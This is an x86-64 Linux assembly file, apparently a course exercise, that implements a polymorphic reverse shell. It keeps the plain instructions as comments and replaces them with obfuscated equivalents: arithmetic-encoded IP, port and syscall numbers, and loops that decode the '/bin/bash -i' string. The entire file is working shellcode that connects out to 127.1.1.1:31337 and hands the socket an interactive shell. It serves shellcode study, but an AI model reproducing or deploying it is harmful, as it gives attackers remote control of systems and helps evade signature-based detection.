;--------------------------------
; ch10-revshell64-poly.nasm
; by Michael Born (@blu3gl0w13)
; Date: 2019
;-------------------------------

global _start


section .text


_start:

	; int socket(int domain, int type, int protocol)

	;xor rax, rax
	;mov al, 41
	;xor rdi, rdi
	;add dil, 0x2		; domain = AF_INET
	;xor rsi, rsi
	;add rsi, 0x1		; type = SOCK_STREAM
	;xor rdx, rdx
	;syscall

	mov rbx, rax
	xor rax, rbx
	mov r10, rsi
	mov r9, rdi
	xor rsi, r10
	xor rdi, r9
	inc rsi
	inc dil
	inc dil
	mov al, 42
	dec al
	syscall



	; copy sockfd into rdi for later use

	; mov rdi, rax
	
	xor r8, r8
	mov r8, rax



	; AF_INET = 2
	; PORT = 31337
	; IP = 127.1.1.1
	; len = 8

	;xor rax, rax 
	;push rax
	;mov dword [rsp-4], 0x0101017f	;IP = 127.1.1.1
	;mov word [rsp-6], 0x697a	;PORT = 31337		
	;mov dword [rsp-10], eax		;NULL padding
	;mov byte [rsp-8], 0x2		;AF_INET
	;sub rsp, 8
	
	mov rbx, rax
	xor rax, rbx
	mov dword [rsp-4], 0x1111118a
	sub dword [rsp-4], 0x1010100b
	mov word [rsp-6], 0x6879
	add word [rsp-6], 0x0101
	mov dword [rsp-10], eax
	mov byte [rsp-8], 0x1
	inc byte [rsp-8]
	sub rsp, 0x8



	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	
	;xor rax, rax
	;mov al, 42
	;mov rsi, rsp
	;xor rdx, rdx
	;add rdx, 16
	;syscall

	xor rax, rax
	mov al, 44
	dec al
	dec al
	mov rsi, rsp
	xor rdx, rdx
	xor rdi, rdi
	mov rdi, r8
	xor rcx, rcx
	add cl, 16

conL:
	inc dl
	loop conL
	syscall


        ; redirect socket to stdin, stdout, stderr
	; int dup3(int oldfd, int newfd        

	;xor rax, rax
	;mov al, 33
        ;xor rsi, rsi
        ;syscall

	xor rax, rax
	mov al, 33
	xor rsi, rsi
	inc rsi
	inc rsi
	syscall


	;xor rax, rax
        ;mov al, 33
        ;inc rsi
        ;syscall

	xor rax, rax
	mov al, 33
	dec rsi
	syscall


	;xor rax, rax
        ;mov al, 33
        ;inc rsi
        ;syscall

	xor rax, rax
	mov al, 33
	dec rsi
	syscall



        ; int execve(const char *filename, char *const argv[], char *const envp[])


        ;xor rax, rax
        ;push rax
	;xor rbx, rbx
        ;mov rbx, 0x687361622f2f2f2f
	;push rbx
	;mov rbx, 0x6e69622f2f2f2f2f
        ;push rbx
        ;mov rdi, rsp
        ;push rax
	;push word 0x692d
        ;mov rsi, rsp
	;push rax
	;push rsi
	;push rdi
	;mov rsi, rsp	
	;xor rdx, rdx
        ;add rax, 59
        ;syscall
 
	xor rax, rax
	push rax
	xor rbx, rbx
	mov rbx, 0x6974626330303030
	push rbx
	xor r10, r10
	mov r10, rsp
	xor rcx, rcx
	mov cl, 0x8


bnL:
	dec byte [r10]
	inc r10
	loop bnL

	pop rbx
	push rbx
	xor r15, r15
	mov r15, 0x6d68612e2e2e2e2e
	push r15
	mov r10, rsp
	xor rcx, rcx
	mov cl, 0x8

bshL:
	inc byte [r10]
	inc r10
	loop bshL
	pop r15
	push r15
	mov rdi, rsp
	push rax
	push word 0x682c
	add word [rsp], 0x0101
	mov rsi, rsp
	push rax
	push rsi
	push rdi
	mov rsi, rsp
	xor rdx, rdx
	xor rcx, rcx
	mov rcx, 59
exLp:
	inc rax
	loop exLp
	syscall
